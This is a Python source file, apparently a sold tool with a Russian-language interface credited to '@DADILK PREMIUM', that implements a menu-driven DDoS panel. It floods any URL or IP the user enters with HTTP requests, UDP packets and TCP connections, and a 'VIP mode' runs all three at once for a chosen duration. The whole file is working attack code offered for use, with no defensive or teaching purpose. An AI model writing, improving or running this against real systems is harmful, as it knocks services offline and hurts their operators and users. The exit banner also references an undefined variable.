#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===============================================================
# ██████╗ ██████╗  ██████╗ ███████╗
# ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
# ██║  ██║██║  ██║██║   ██║███████╗
# ██║  ██║██║  ██║██║   ██║╚════██║
# ██████╔╝██████╔╝╚██████╔╝███████║
# ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
# ===============================================================
#                    ДУДОС МОЯ ПАНЕЛЬ
# ===============================================================
#                    BY @DADILK PREMIUM
# ===============================================================

import os
import sys
import time
import random
import socket
import threading
import datetime
import platform
import subprocess
import struct
import signal
import http.client
import urllib.parse
import urllib.request
import requests
import re
import ssl
from typing import Optional, Tuple
from urllib.parse import urlparse

# Цвета
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ===============================================================
# ГЛАВНАЯ НАДПИСЬ ДУДОС (КАК ТЫ ПРОСИЛ)
# ===============================================================

DUDOS_ASCII = f"""
{RED}██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗{RESET}
{RED}██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║███████╗{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║╚════██║{RESET}
{RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║{RESET}
{RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}

{RED}███╗   ███╗ ██████╗ ██╗   ██╗{RESET}
{RED}████╗ ████║██╔═══██╗╚██╗ ██╔╝{RESET}
{RED}██╔████╔██║██║   ██║ ╚████╔╝ {RESET}
{RED}██║╚██╔╝██║██║   ██║  ╚██╔╝  {RESET}
{RED}██║ ╚═╝ ██║╚██████╔╝   ██║   {RESET}
{RED}╚═╝     ╚═╝ ╚═════╝    ╚═╝   {RESET}
"""

# ===============================================================
# ОСНОВНОЙ КЛАСС DDOS ПАНЕЛИ
# ===============================================================

class MyDudosPanel:
    def __init__(self):
        self.running = True
        self.attack_threads = []
        self.stop_attack = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = None
        self.target_url = ""
        self.target_ip = ""
        self.target_port = 80
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def extract_domain_from_url(self, url):
        """Извлечение домена из URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return parsed.netloc or parsed.path
    
    def resolve_domain(self, domain):
        """Резолв домена в IP"""
        try:
            ip = socket.gethostbyname(domain)
            return ip
        except:
            return None
    
    def get_port_from_url(self, url):
        """Получение порта из URL"""
        if url.startswith('https://'):
            return 443
        return 80
    
    def print_menu(self):
        """Печать меню"""
        print(f"\n{RED}{'='*60}{RESET}")
        print(f"{RED}█{RESET} 1. {'ДУДОС ПО ССЫЛКЕ':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 2. {'ДУДОС ПО IP':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 3. {'HTTP FLOOD':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 4. {'UDP FLOOD':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 5. {'TCP SYN FLOOD':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 6. {'VIP MODE (ВСЁ СРАЗУ)':<20} {RED}█{RESET}")
        print(f"{RED}█{RESET} 0. {'ВЫХОД':<20} {RED}█{RESET}")
        print(f"{RED}{'='*60}{RESET}")
    
    def http_flood(self, target_ip, target_port, duration):
        """HTTP флуд"""
        end_time = time.time() + duration
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        
        paths = ["/", "/index.html", "/home", "/api", "/wp-admin", "/admin"]
        
        while time.time() < end_time and not self.stop_attack:
            try:
                conn = http.client.HTTPConnection(f"{target_ip}:{target_port}", timeout=3)
                path = random.choice(paths)
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                conn.request("GET", path, headers=headers)
                conn.getresponse()
                conn.close()
                self.packets_sent += 1
            except:
                pass
    
    def udp_flood(self, target_ip, target_port, duration):
        """UDP флуд"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < end_time and not self.stop_attack:
            try:
                packet_size = random.randint(1024, 4096)
                packet = random._urandom(packet_size)
                sock.sendto(packet, (target_ip, target_port))
                self.packets_sent += 1
                self.bytes_sent += packet_size
            except:
                pass
        sock.close()
    
    def tcp_syn_flood(self, target_ip, target_port, duration):
        """TCP SYN флуд"""
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect_ex((target_ip, target_port))
                s.close()
                self.packets_sent += 1
            except:
                pass
    
    def vip_mode(self, target_ip, target_port, duration):
        """VIP режим - все атаки одновременно"""
        attacks = [
            self.http_flood,
            self.udp_flood,
            self.tcp_syn_flood
        ]
        
        threads = []
        for attack in attacks:
            t = threading.Thread(target=attack, args=(target_ip, target_port, duration))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Мониторинг
        end_monitor = time.time() + duration
        while time.time() < end_monitor and not self.stop_attack:
            elapsed = int(time.time() - self.start_time)
            remaining = duration - elapsed
            print(f"\r{RED}▶ ВРЕМЯ: {elapsed}с | ОСТАЛОСЬ: {remaining}с | ПАКЕТОВ: {self.packets_sent}{RESET}", end="")
            time.sleep(1)
        print()
        
        for t in threads:
            t.join()
    
    def attack_by_url(self, url, duration, attack_type):
        """Атака по ссылке"""
        print(f"\n{RED}▶ РАЗБОР ССЫЛКИ: {url}{RESET}")
        
        # Извлекаем домен
        domain = self.extract_domain_from_url(url)
        print(f"{RED}▶ ДОМЕН: {domain}{RESET}")
        
        # Резолвим IP
        ip = self.resolve_domain(domain)
        if not ip:
            print(f"{RED}▶ НЕ УДАЛОСЬ НАЙТИ IP!{RESET}")
            return False
        
        print(f"{RED}▶ IP АДРЕС: {ip}{RESET}")
        
        # Определяем порт
        port = self.get_port_from_url(url)
        print(f"{RED}▶ ПОРТ: {port}{RESET}")
        
        # Запускаем атаку
        self.target_ip = ip
        self.target_port = port
        
        attack_func = None
        attack_name = ""
        
        if attack_type == 1:
            attack_func = self.http_flood
            attack_name = "HTTP FLOOD"
        elif attack_type == 2:
            attack_func = self.udp_flood
            attack_name = "UDP FLOOD"
        elif attack_type == 3:
            attack_func = self.tcp_syn_flood
            attack_name = "TCP SYN FLOOD"
        elif attack_type == 4:
            attack_func = self.vip_mode
            attack_name = "VIP MODE"
        else:
            attack_func = self.http_flood
            attack_name = "HTTP FLOOD"
        
        print(f"\n{RED}▶ ЗАПУСК АТАКИ: {attack_name}{RESET}")
        print(f"{RED}▶ ЦЕЛЬ: {ip}:{port}{RESET}")
        print(f"{RED}▶ ДЛИТЕЛЬНОСТЬ: {duration} СЕКУНД{RESET}")
        print(f"{RED}▶ ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL+C{RESET}\n")
        
        self.stop_attack = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        
        # Запуск атаки в отдельном потоке
        attack_thread = threading.Thread(
            target=attack_func,
            args=(ip, port, duration)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
        # Мониторинг
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                elapsed = int(time.time() - self.start_time)
                remaining = duration - elapsed
                speed = self.packets_sent / elapsed if elapsed > 0 else 0
                
                print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с | ПАКЕТОВ: {self.packets_sent:8d} | СКОРОСТЬ: {speed:.0f} пак/с{RESET}", end="")
                time.sleep(1)
            
            print(f"\n\n{RED}▶ АТАКА ЗАВЕРШЕНА! ОТПРАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
            
        except KeyboardInterrupt:
            self.stop_attack = True
            print(f"\n\n{RED}▶ АТАКА ОСТАНОВЛЕНА! ОТПРАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
        
        return True
    
    def run(self):
        """Запуск панели"""
        while self.running:
            self.clear_screen()
            
            # Главная надпись ДУДОС МОЯ
            print(DUDOS_ASCII)
            print(f"{RED}{'='*60}{RESET}")
            print(f"{RED}█{RESET} {'ПАНЕЛЬ УПРАВЛЕНИЯ':^58} {RED}█{RESET}")
            print(f"{RED}█{RESET} {'BY @DADILK PREMIUM':^58} {RED}█{RESET}")
            print(f"{RED}{'='*60}{RESET}")
            
            self.print_menu()
            
            choice = input(f"{RED}▶ ВЫБОР: {RESET}").strip()
            
            if choice == '0':
                self.running = False
                break
            
            elif choice == '1':
                # Дудос по ссылке
                print(f"\n{RED}▶ ВВЕДИТЕ ССЫЛКУ ДЛЯ АТАКИ{RESET}")
                print(f"{RED}  (ПРИМЕР: https://example.com){RESET}")
                url = input(f"{RED}▶ ССЫЛКА: {RESET}").strip()
                
                print(f"\n{RED}▶ ВЫБЕРИТЕ ТИП АТАКИ:{RESET}")
                print(f"{RED}  1. HTTP FLOOD{RESET}")
                print(f"{RED}  2. UDP FLOOD{RESET}")
                print(f"{RED}  3. TCP SYN FLOOD{RESET}")
                print(f"{RED}  4. VIP MODE (ВСЁ СРАЗУ){RESET}")
                atype = input(f"{RED}▶ ТИП (1-4): {RESET}").strip()
                
                try:
                    atype = int(atype)
                    if atype < 1 or atype > 4:
                        atype = 1
                except:
                    atype = 1
                
                duration = input(f"{RED}▶ ДЛИТЕЛЬНОСТЬ (СЕКУНД): {RESET}").strip()
                try:
                    duration = int(duration)
                except:
                    duration = 60
                
                self.attack_by_url(url, duration, atype)
                input(f"\n{RED}▶ НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
            
            elif choice == '2':
                # Дудос по IP
                ip = input(f"{RED}▶ ВВЕДИТЕ IP ЦЕЛИ: {RESET}").strip()
                port = input(f"{RED}▶ ВВЕДИТЕ ПОРТ: {RESET}").strip()
                
                try:
                    port = int(port)
                except:
                    port = 80
                
                duration = input(f"{RED}▶ ДЛИТЕЛЬНОСТЬ (СЕКУНД): {RESET}").strip()
                try:
                    duration = int(duration)
                except:
                    duration = 60
                
                print(f"\n{RED}▶ ВЫБЕРИТЕ ТИП АТАКИ:{RESET}")
                print(f"{RED}  1. HTTP FLOOD{RESET}")
                print(f"{RED}  2. UDP FLOOD{RESET}")
                print(f"{RED}  3. TCP SYN FLOOD{RESET}")
                print(f"{RED}  4. VIP MODE (ВСЁ СРАЗУ){RESET}")
                atype = input(f"{RED}▶ ТИП (1-4): {RESET}").strip()
                
                try:
                    atype = int(atype)
                    if atype < 1 or atype > 4:
                        atype = 1
                except:
                    atype = 1
                
                attack_func = None
                attack_name = ""
                
                if atype == 1:
                    attack_func = self.http_flood
                    attack_name = "HTTP FLOOD"
                elif atype == 2:
                    attack_func = self.udp_flood
                    attack_name = "UDP FLOOD"
                elif atype == 3:
                    attack_func = self.tcp_syn_flood
                    attack_name = "TCP SYN FLOOD"
                elif atype == 4:
                    attack_func = self.vip_mode
                    attack_name = "VIP MODE"
                
                print(f"\n{RED}▶ ЗАПУСК АТАКИ: {attack_name}{RESET}")
                print(f"{RED}▶ ЦЕЛЬ: {ip}:{port}{RESET}")
                print(f"{RED}▶ ДЛИТЕЛЬНОСТЬ: {duration} СЕКУНД{RESET}\n")
                
                self.stop_attack = False
                self.packets_sent = 0
                self.bytes_sent = 0
                self.start_time = time.time()
                
                attack_thread = threading.Thread(
                    target=attack_func,
                    args=(ip, port, duration)
                )
                attack_thread.daemon = True
                attack_thread.start()
                
                try:
                    end_time = time.time() + duration
                    while time.time() < end_time:
                        elapsed = int(time.time() - self.start_time)
                        remaining = duration - elapsed
                        speed = self.packets_sent / elapsed if elapsed > 0 else 0
                        
                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с | ПАКЕТОВ: {self.packets_sent:8d} | СКОРОСТЬ: {speed:.0f} пак/с{RESET}", end="")
                        time.sleep(1)
                    
                    print(f"\n\n{RED}▶ АТАКА ЗАВЕРШЕНА! ОТПРАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
                    
                except KeyboardInterrupt:
                    self.stop_attack = True
                    print(f"\n\n{RED}▶ АТАКА ОСТАНОВЛЕНА! ОТПРАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
                
                input(f"\n{RED}▶ НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
            
            elif choice in ['3', '4', '5', '6']:
                # Быстрые атаки
                ip = input(f"{RED}▶ ВВЕДИТЕ IP ЦЕЛИ: {RESET}").strip()
                port = input(f"{RED}▶ ВВЕДИТЕ ПОРТ: {RESET}").strip()
                
                try:
                    port = int(port)
                except:
                    port = 80
                
                duration = input(f"{RED}▶ ДЛИТЕЛЬНОСТЬ (СЕКУНД): {RESET}").strip()
                try:
                    duration = int(duration)
                except:
                    duration = 60
                
                attack_map = {
                    '3': (self.http_flood, "HTTP FLOOD"),
                    '4': (self.udp_flood, "UDP FLOOD"),
                    '5': (self.tcp_syn_flood, "TCP SYN FLOOD"),
                    '6': (self.vip_mode, "VIP MODE")
                }
                
                attack_func, attack_name = attack_map[choice]
                
                print(f"\n{RED}▶ ЗАПУСК АТАКИ: {attack_name}{RESET}")
                print(f"{RED}▶ ЦЕЛЬ: {ip}:{port}{RESET}")
                print(f"{RED}▶ ДЛИТЕЛЬНОСТЬ: {duration} СЕКУНД{RESET}\n")
                
                self.stop_attack = False
                self.packets_sent = 0
                self.bytes_sent = 0
                self.start_time = time.time()
                
                attack_thread = threading.Thread(
                    target=attack_func,
                    args=(ip, port, duration)
                )
                attack_thread.daemon = True
                attack_thread.start()
                
                try:
                    end_time = time.time() + duration
                    while time.time() < end_time:
                        elapsed = int(time.time() - self.start_time)
                        remaining = duration - elapsed
                        speed = self.packets_sent / elapsed if elapsed > 0 else 0
                        
                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с | ПАКЕТОВ: {self.packets_sent:8d} | СКОРОСТЬ: {speed:.0f} пак/с{RESET}", end="")
                        time.sleep(1)
                    
                    print(f"\n\n{RED}▶ АТАКА ЗАВЕРШЕНА! ОТПРАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
                    
                except KeyboardInterrupt:
                    self.stop_attack = True
                    print(f"\n\n{RED}▶ АТАКА ОСТАНОВЛЕНА! ОТПАВЛЕНО ПАКЕТОВ: {self.packets_sent}{RESET}")
                
                input(f"\n{RED}▶ НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
        
        # Выход
        self.clear_screen()
        print(f"""
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}█                                                          █{RESET}
{RED}█         ДУДОС МОЯ ПАНЕЛЬ ЗАВЕРШАЕТ РАБОТУ               █{RESET}
{RED}█                                                          █{RESET}
{RED}█         СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ                        █{RESET}
{RED}█         BY @DADILK PREMIUM                               █{RESET}
{RED}█                                                          █{RESET}
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}обход by DADILK{RS}
{RED}Спасибо за покупку{RS}
        """)
        time.sleep(2)

# ===============================================================
# ЗАПУСК
# ===============================================================

if __name__ == "__main__":
    try:
        # Проверка на Termux/iSH
        if 'ANDROID_ROOT' in os.environ:
            print(f"{RED}▶ Termux обнаружен{RESET}")
        elif 'ISH' in os.environ or 'iSH' in os.environ:
            print(f"{RED}▶ iSH обнаружен{RESET}")
        
        panel = MyDudosPanel()
        panel.run()
    except KeyboardInterrupt:
        print(f"\n{RED}▶ ВЫХОД ПО CTRL+C{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}▶ ОШИБКА: {e}{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(1)
